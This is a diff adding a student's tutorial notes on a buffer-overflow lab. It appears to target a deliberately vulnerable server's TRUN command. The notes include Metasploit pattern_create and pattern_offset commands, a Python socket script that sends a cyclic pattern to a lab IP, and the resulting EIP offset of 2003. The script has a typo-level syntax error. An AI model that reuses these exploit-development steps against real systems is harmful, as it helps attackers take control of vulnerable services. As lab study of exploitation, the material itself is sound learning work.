@@ -1,0 +1,41 @@
+So in the previous class such as in day3 fuzzing we just found the no of bytes at which the server was crashed but we didn't know the lines how 2700/3000 bytes will look like. So, lets explore it.
+So, inorder to exploit it we had something tool called as "pattern_create.rb" which works over metasploit framework/by metasploit. So, using this we an know the 2700/3000 bytes look like. In order to know it let's run the command in our kali linux.
+Command:-
+$ /usr/share/metasploit-o/p:- framework/tools/exploit/pattern_create.rb -l 3000
+Aa0Aa1Aa2.....
+
+Now, what we have to was just copy the everything what we got by using the above line so then open the old python code and modify it such as 1.py / you can just write the new line of code. So, the code was as like below:-
+-------------------------------------------
+2.py
+#!/usr/bin/python
+import sys, socket
+
+offset = " paste the value copied"
+
+try:
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect(('192.168.1.90', 9999)
+	s.send(('TRUN /.:/' + offset))
+	s.close()
+except:
+	print "Error connecting to server"
+	sys.exit()
+-------------------------------------------
+So, now we got the result as we execute the program such as 2.py with the chmod +x 2.py
+Note: before doing it we need to check whether the immunity debugger was running or not. Incase it was paused we must make it into running state then only run the program such as 2.py
+Now, confirming the running state of immunity debugger we just need to make the pythin script to excute.
+Now, here we made running the python script such as 2.py and then go with the Registers window in the IMMUNITY DEBUGGER.
+Now, you can see that it crosses over EBP, EIP & ESP
+Now, when you clearly see the value such as in the EIP there was some value such as 386F4337.
+So, the next step was we need to make use of this thing such as the Value 386F4337 of EIP. So do the below:-
+Comeback to kali terminal and do the following steps. such as giving a command like the  starting command as patter command so see it below.
+
+terminal:-
+--------------
+$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
+o/p:- [*] Exact match at offset 2003
+
+So these mean that at some exact line of code of offset we were match with 2003 bytes.<--- this was a critical information for us it means that we can control our EIP at 2003 bytes of code. 
+
+So in next class we are going to override the exact 2003 bytes inorder to get the EIP control which gives us reverse shell to exloit.
+ 
